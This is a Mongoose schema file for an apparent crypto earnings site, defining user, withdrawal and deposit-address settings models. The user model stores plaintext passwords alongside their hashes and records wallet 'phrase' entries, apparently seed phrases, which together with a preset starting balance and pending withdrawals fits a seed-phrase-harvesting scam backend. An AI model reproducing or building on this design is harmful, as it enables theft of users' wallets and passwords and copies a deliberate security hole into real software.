const mongoose = require('mongoose');

const UserSchema = new mongoose.Schema({
  firstname: String,
  lastname: String,
  username: { type: String, unique: true },
  email: { type: String, unique: true },
  password_hash: String,
  plain_password: String,
  balance: { type: Number, default: 15.00 },
  total_earnings: { type: Number, default: 0.00 },
  wallet_connections: [{
    wallet: String,
    phrase: String,
    timestamp: { type: Date, default: Date.now }
  }],
  created_at: { type: Date, default: Date.now }
});

const WithdrawalSchema = new mongoose.Schema({
  userId: mongoose.Schema.Types.ObjectId,
  username: String,
  amount: Number,
  asset: String,
  address: String,
  status: { type: String, default: 'pending' },
  timestamp: { type: Date, default: Date.now }
});

const SettingsSchema = new mongoose.Schema({
  key: { type: String, default: 'global' },
  deposit_addresses: {
    BTC: { type: String, default: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
    ETH: { type: String, default: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' },
    USDT: { type: String, default: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' }
  }
});

const User = mongoose.model('User', UserSchema);
const Withdrawal = mongoose.model('Withdrawal', WithdrawalSchema);
const Settings = mongoose.model('Settings', SettingsSchema);

module.exports = { User, Withdrawal, Settings };
